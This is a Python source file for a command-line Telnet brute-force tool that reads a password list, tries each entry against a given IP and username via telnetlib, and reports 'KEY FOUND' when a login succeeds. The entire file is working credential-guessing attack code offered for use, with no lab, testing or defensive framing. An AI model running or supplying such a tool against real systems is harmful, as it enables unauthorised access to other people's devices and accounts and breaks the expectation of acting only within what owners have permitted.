import telnetlib
import argparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def try_telnet_login(target_ip, password, username):
    try:
        # Connect to the Telnet service
        tn = telnetlib.Telnet(target_ip)
        tn.read_until(b"login: ")
        tn.write(username.encode('ascii') + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
        
        # Wait for the login prompt or success message
        response = tn.read_until(b"login incorrect", timeout=5)
        if b"login incorrect" in response:
            return False
        return True
    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}")
        return False

def brute_force_telnet(target_ip, password_list, username):
    for password in password_list:
        print(Fore.YELLOW + f"Trying Passphrase: {password}")
        if try_telnet_login(target_ip, password, username):
            print(Fore.GREEN + f"KEY FOUND: [{password}]")
            return password
    print(Fore.RED + "KEY NOT FOUND")
    return None

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Telnet Bruteforce Script")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("-P", "--passwordlist", help="Path to password list file", required=True)
    parser.add_argument("username", help="Username for login")
    args = parser.parse_args()

    # Read password list from file
    try:
        with open(args.passwordlist, "r") as f:
            password_list = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(Fore.RED + "Password list file not found.")
        return
    
    # Start brute-forcing
    brute_force_telnet(args.target_ip, password_list, args.username)

if __name__ == "__main__":
    main()
